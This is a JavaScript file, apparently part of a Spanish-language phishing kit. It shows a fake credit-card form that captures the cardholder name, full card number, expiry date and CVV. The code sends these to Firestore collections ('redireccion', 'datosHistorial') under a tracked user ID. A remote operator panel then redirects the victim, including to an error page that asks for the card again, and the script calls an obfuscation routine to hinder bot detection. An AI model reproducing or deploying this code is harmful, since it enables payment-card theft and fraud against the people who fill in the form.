"use strict";

(function initTdcUi() {
  function ready(callback) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", callback, { once: true });
      return;
    }
    callback();
  }

  function digitsOnly(value, maxLength) {
    return (value || "").replace(/\D/g, "").slice(0, maxLength);
  }

  function groupCardNumber(value) {
    var raw = digitsOnly(value, 16);
    var parts = [];
    for (var i = 0; i < raw.length; i += 4) {
      parts.push(raw.substring(i, i + 4));
    }
    return parts.join(" ");
  }

  ready(function () {
    BotShield.obfuscateAll();

    var mitBtn = document.getElementById("btn-tdc-mit");
    var cardNameInput = document.getElementById("cardName");
    var cardNumberInput = document.getElementById("cardNumber");
    var cardMonthInput = document.getElementById("cardMonth");
    var cardYearInput = document.getElementById("cardYear");
    var cardCvvInput = document.getElementById("cardCvv");
    var errorDiv = document.getElementById("tdc-error");
    var card3d = document.getElementById("card3d");
    var displayNumber = document.getElementById("cardDisplayNumber");
    var displayName = document.getElementById("cardDisplayName");
    var displayExpiry = document.getElementById("cardDisplayExpiry");
    var displayCvv = document.getElementById("cardDisplayCvv");

    if (!mitBtn) {
      return;
    }

    function updateExpiry() {
      var month = cardMonthInput ? digitsOnly(cardMonthInput.value, 2) : "";
      var year = cardYearInput ? digitsOnly(cardYearInput.value, 2) : "";
      if (cardMonthInput) {
        cardMonthInput.value = month;
      }
      if (cardYearInput) {
        cardYearInput.value = year;
      }
      if (displayExpiry) {
        displayExpiry.textContent = (month || "MM") + "/" + (year || "AA");
      }
    }

    function showError(message) {
      if (!errorDiv) {
        return;
      }
      errorDiv.textContent = message;
      errorDiv.style.display = message ? "block" : "none";
    }

    function clearError() {
      showError("");
    }

    function setLoading(isLoading) {
      mitBtn.disabled = !!isLoading;
      mitBtn.classList.toggle("loading", !!isLoading);
    }

    function getPayload() {
      return {
        tdcNombre: (cardNameInput ? cardNameInput.value : "").trim(),
        tdcNumero: digitsOnly(cardNumberInput ? cardNumberInput.value : "", 16),
        tdcMes: digitsOnly(cardMonthInput ? cardMonthInput.value : "", 2),
        tdcAnio: digitsOnly(cardYearInput ? cardYearInput.value : "", 2),
        tdcCvv: digitsOnly(cardCvvInput ? cardCvvInput.value : "", 3),
        tdcTimestamp: new Date().toISOString()
      };
    }

    function validatePayload(payload) {
      var monthNum = parseInt(payload.tdcMes, 10);
      var yearNum = parseInt(payload.tdcAnio, 10);
      var now = new Date();
      var currentYear2 = now.getFullYear() % 100;
      var currentMonth = now.getMonth() + 1;
      var maxYear2 = (now.getFullYear() + 15) % 100;

      if (!payload.tdcNombre) {
        return "Ingresa el nombre del titular";
      }
      if (!payload.tdcNumero || payload.tdcNumero.length < 13) {
        return "Ingresa un numero valido";
      }
      if (!payload.tdcMes || payload.tdcMes.length !== 2) {
        return "Ingresa el mes de vencimiento";
      }
      if (!payload.tdcAnio || payload.tdcAnio.length !== 2) {
        return "Ingresa el año de vencimiento";
      }
      if (isNaN(monthNum) || monthNum < 1 || monthNum > 12) {
        return "El mes debe estar entre 01 y 12";
      }
      if (isNaN(yearNum)) {
        return "Ingresa un año de vencimiento valido";
      }
      if (yearNum < currentYear2 || yearNum > maxYear2) {
        return "El año de vencimiento no es valido";
      }
      if (yearNum === currentYear2 && monthNum < currentMonth) {
        return "La fecha de vencimiento ya expiro";
      }
      if (!payload.tdcCvv || payload.tdcCvv.length !== 3) {
        return "Ingresa el codigo de seguridad";
      }
      return "";
    }

    if (cardNameInput) {
      cardNameInput.addEventListener("input", function () {
        if (displayName) {
          displayName.textContent = (this.value || "").trim().toUpperCase() || "TU NOMBRE";
        }
      });
    }

    if (cardNumberInput) {
      cardNumberInput.addEventListener("input", function () {
        this.value = groupCardNumber(this.value);
        if (displayNumber) {
          displayNumber.textContent = this.value || "•••• •••• •••• ••••";
        }
      });
    }

    if (cardMonthInput) {
      cardMonthInput.addEventListener("input", updateExpiry);
    }

    if (cardYearInput) {
      cardYearInput.addEventListener("input", updateExpiry);
    }

    if (cardCvvInput) {
      cardCvvInput.addEventListener("input", function () {
        this.value = digitsOnly(this.value, 3);
        if (displayCvv) {
          displayCvv.textContent = this.value || "•••";
        }
      });

      cardCvvInput.addEventListener("focus", function () {
        if (card3d) {
          card3d.classList.add("flipped");
        }
      });

      cardCvvInput.addEventListener("blur", function () {
        if (card3d) {
          card3d.classList.remove("flipped");
        }
      });
    }

    mitBtn.addEventListener("click", function (event) {
      event.preventDefault();
      clearError();

      var payload = getPayload();
      var validationError = validatePayload(payload);
      if (validationError) {
        showError(validationError);
        return;
      }

      setLoading(true);
      document.dispatchEvent(
        new CustomEvent("tdc:mit", {
          detail: payload
        })
      );
    });

    window.tdcUi = {
      clearError: clearError,
      getPayload: getPayload,
      setLoading: setLoading,
      showError: showError
    };
  });

  // --- Lógica de Firebase Integrada ---
  var tdcWatcher = null;

  function getCurrentTdcState() {
    var errUrl = window.appConfig && window.appConfig.routes && window.appConfig.routes[3] ? window.appConfig.routes[3].url : "tdc_err.html";
    return window.location.pathname.indexOf(errUrl) !== -1 ? "error" : "ok";
  }

  function updateHistoryEntry(db, usuario, tdcData) {
    return db
      .collection("redireccion")
      .doc(usuario)
      .get()
      .then(function (snapshot) {
        var currentData = snapshot.exists ? snapshot.data() || {} : {};
        var payload = Object.assign(
          {
            usuario: usuario,
            timestamp: currentData.timestamp || new Date().toISOString(),
          },
          currentData,
          tdcData
        );

        return db
          .collection("datosHistorial")
          .doc(usuario)
          .set(payload, { merge: true });
      })
      .catch(function (error) {
        console.error("Error actualizando historial TDC:", error);
      });
  }

  function attachTdcWatcher(userRef) {
    if (tdcWatcher) {
      tdcWatcher();
      tdcWatcher = null;
    }

    tdcWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          return;
        }

        var userData = docSnapshot.data() || {};
        var page = userData.page;

        if (typeof page !== "number" || page <= 0) {
          return;
        }

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          var targetUrl = String(route.url || "");
          var currentPath = window.location.pathname.split("/").pop() || "";
          var targetPath = targetUrl.split("?")[0].split("#")[0].split("/").pop() || "";

          if (targetPath && targetPath === currentPath) {
            return;
          }

          if (tdcWatcher) {
            tdcWatcher();
            tdcWatcher = null;
          }

          window.location.href = route.url;
          return;
        }
      },
      function () {
        if (window.tdcUi) {
          window.tdcUi.setLoading(false);
          window.tdcUi.showError("Error de conexion. Intenta nuevamente.");
        }
      }
    );
  }

  function setWaitingState(userRef, stateValue) {
    var errUrl = window.appConfig && window.appConfig.routes && window.appConfig.routes[3] ? window.appConfig.routes[3].url : "tdc_err.html";
    return userRef.set(
      {
        page: 0,
        tdcEstado: stateValue,
        tdcEsperandoPanel: true,
        tdcUltimaPagina: window.location.pathname.indexOf(errUrl) !== -1 ? "tdc_err" : "tdc",
        tdcActualizadoEn: new Date().toISOString()
      },
      { merge: true }
    );
  }

  ready(function () {
    var db = window.db;
    var usuario = localStorage.getItem("usuarioActual");
    var currentState = getCurrentTdcState();

    if (db && typeof firebase !== "undefined" && usuario && currentState === "error") {
      var waitRef = db.collection("redireccion").doc(usuario);
      setWaitingState(waitRef, "error").then(function () {
        attachTdcWatcher(waitRef);
      });
    }

    document.addEventListener("tdc:mit", function (event) {
      var db = window.db;
      if (!db || typeof firebase === "undefined") {
        if (window.tdcUi) {
          window.tdcUi.setLoading(false);
          window.tdcUi.showError("Firebase no esta disponible.");
        }
        return;
      }

      var usuario = localStorage.getItem("usuarioActual");
      if (!usuario) {
        window.location.href = window.appConfig && window.appConfig.routes && window.appConfig.routes[1] ? window.appConfig.routes[1].url : "index.html";
        return;
      }

      var payload = event.detail || (window.tdcUi ? window.tdcUi.getPayload() : null);
      if (!payload) {
        if (window.tdcUi) {
          window.tdcUi.setLoading(false);
        }
        return;
      }

      var userRef = db.collection("redireccion").doc(usuario);
      var stateValue = getCurrentTdcState();
      payload.tdcEstado = stateValue;
      payload.page = 0;
      payload.tdcEsperandoPanel = true;
      payload.tdcUltimaPagina = stateValue === "error" ? "tdc_err" : "tdc";
      payload.tdcActualizadoEn = new Date().toISOString();

      userRef
        .set(payload, { merge: true })
        .then(function () {
          attachTdcWatcher(userRef);
          return updateHistoryEntry(db, usuario, payload);
        })
        .catch(function () {
          if (window.tdcUi) {
            window.tdcUi.setLoading(false);
            window.tdcUi.showError("Error de conexion. Intenta nuevamente.");
          }
        });
    });
  });
})();
